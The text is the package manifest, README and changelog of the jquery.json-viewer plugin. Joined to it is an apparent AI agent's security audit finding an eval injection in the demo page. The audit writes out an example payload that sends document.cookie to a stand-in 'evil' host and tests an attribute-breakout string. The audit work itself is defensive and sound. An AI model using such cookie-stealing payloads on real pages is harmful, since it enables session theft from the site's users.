{ "name": "jquery.json-viewer", "version": "1.4.0", "description": "jQuery plugin for displaying JSON data", "repository": { "type": "git", "url": "https://github.com/abodelot/jquery.json-viewer.git" }, "keywords": [ "jquery-plugin", "json", "json-viewer", "json2html" ], "author": "Alexandre Bodelot ", "license": "MIT", "bugs": { "url": "https://github.com/abodelot/jquery.json-viewer/issues" }, "homepage": "https://github.com/abodelot/jquery.json-viewer", "scripts": { "lint": "eslint json-viewer test", "test": "jest" }, "devDependencies": { "eslint": "^7.28.0", "eslint-plugin-jest": "^24.3.6", "jest": "^27.0.4", "jquery": "^3.6.0" } } # jQuery json-viewer ![npm](https://img.shields.io/npm/v/jquery.json-viewer.svg) ![npm](https://img.shields.io/npm/l/jquery.json-viewer.svg) ![npm](https://img.shields.io/npm/dt/jquery.json-viewer.svg) ![workflow](https://github.com/abodelot/jquery.json-viewer/actions/workflows/node.js.yml/badge.svg) *json-viewer* is a jQuery plugin for easily displaying JSON objects by transforming them into HTML. Features: - Syntax highlighting - Collapse and expand child nodes on click - Clickable links - Easily readable and minimal DOM structure Check out the [demo page](https://abodelot.github.io/jquery.json-viewer/demo.html)! ## Install With npm: ```sh npm install jquery.json-viewer ``` Make sure jQuery is already included. Then import `jquery.json-viewer.js` and `jquery.json-viewer.css` in your HTML document: ```html ``` You can also simply copy `json-viewer/jquery.json-viewer.js` and `json-viewer/jquery.json-viewer.css` files from this git repository into your project. ## Usage Call the `jsonViewer()` method on target element and pass your JSON data in argument: ```html 

```

```js
var data = {
  "foobar": "foobaz"
};
$('#json-renderer').jsonViewer(data);
```

## Options

The `jsonViewer` method accepts an optional config object as a second argument. The supported options are:

- `collapsed` (boolean, default: `false`): all nodes are collapsed at html generation.
- `rootCollapsable` (boolean, default: `true`): allow root element to be collasped.
- `withQuotes` (boolean, default: `false`): all JSON keys are surrounded with double quotation marks (`{"foobar": 1}` instead of `{foobar: 1}`).
- `withLinks` (boolean, default: `true`): all values that are valid links will be clickable, if `false` they will only be strings.

Example:

```js
$('#json-renderer').jsonViewer(data, {collapsed: true, withQuotes: true, withLinks: false});
```

## About

- Author: [Alexandre Bodelot](https://github.com/abodelot)
- License: [MIT License](http://opensource.org/licenses/MIT)

1.4.0 - Released on 2019-08-19

  * Fixed performance issue with 'withLinks' option
  * Escape double quotes in string values

1.3.0 - Released on 2019-07-04

  * Improved URL detection
  * Fixed XSS injection with 'withLinks' option
  * Fixed JS error when JSON has an attribute 'hasOwnProperty'

1.2.0 - Released on 2019-03-10

  * Added 'rootCollapsable' option
  * Added 'withLinks' option
  * Added 'withQuotes' option
  * Updated to jQuery 3.x
  * Improved style of toggle arrows
  * Fixed JS error in scrict mode

1.1.0 - Released on 2016-02-16

  * Added 'collapsed' option
  * Escape XML/HTML tags in JSON content
  * Made dict key names clickable

1.0.0 - Released on 2015-01-11

  * Initial release

content.text:
Audit complete. `findings.json` is written in the repo root; no source file was touched.

## Result: 1 exploitable vulnerability

**`demo.html:34` — `renderJson()` — CWE-95 (eval injection)**

```js
var input = eval('(' + $('#json-input').val() + ')');
```

The viewer's input textarea holds a document that is untrusted by design — the page exists so you can paste in a JSON blob and inspect it. `eval` interprets that text as JavaScript, not data, so `{"a": fetch('https://evil/?c='+document.cookie)}` executes in the page's origin. It fires on the button click (line 49), on any option checkbox (line 52), and on page load (line 55). The `try/catch` only runs after evaluation, so it blocks nothing. I confirmed the eval semantics in a scratch harness.

## What I ruled out, with evidence

The plugin itself (`json-viewer/jquery.json-viewer.js`) is the library's only shipped code, and its HTML generation holds up:

- **XSS in values/keys** — `htmlEscape()` (line 29) escapes all five of `& < > ' "`, globally, with `&` first, and is applied to every string value (line 45) and every dict key (line 86) before concatenation. I ran ~23 payloads through the real code via a stub jQuery: every one came out entity-escaped.
- **`javascript:`/`data:` in the generated `href`** (line 48) — unreachable. `isUrl`'s regex requires `([a-z0-9%-]+\.){1,}` right after an optional `http(s)/ftp(s)` scheme, and `:` is not in that class, so no string whose effective scheme is `javascript` can match. The port group only accepts digits. Confirmed empirically, including case, tab, NUL, newline and `:` variants.
- **Attribute breakout in the `href`** — a `"` arrives as `"`, and the HTML tokenizer does not treat a decoded character reference as the attribute delimiter, so `http://a.com/"onmouseover=alert(1)` stays a single attribute value.
- **ReDoS in `isUrl`** — the mandatory `\.` separator makes the repetition split deterministic; timing on adversarial inputs up to 16 KB is linear (0.25 ms).
- **CI script injection** — `.github/workflows/node.js.yml` has no `${{ github.event.* }}` interpolation and no `pull_request_target`/`issue_comment` trigger.
- No server-side code exists, so path traversal, SSRF, XXE, deserialization and authz have no surface here.

## Two real issues I deliberately left out of the JSON

Neither is exploitable, so including them would have been noise:

1. **`line 48`: `target="_blank"` without `rel="noopener noreferrer"`** on links built from JSON data — reverse tabnabbing (CWE-1022), but current browsers imply `noopener` for `target=_blank`. Worth adding as hardening.
2. **`line 86`: `key = htmlEscape(key)` reassigns the loop variable before `json[key]` is read** (lines 92, 97), so a key containing `& < > ' "` is looked up under its escaped name and its value renders empty — `{"a&b": "SECRET"}` displays as `a&b: `. With `{"a&b": "SECRET", "a&b": "DECOY"}` the two keys collide and `a&b` displays `"DECOY"`. That's a correctness/display-integrity bug (the fix is a separate variable for the escaped key), not a code-execution path.
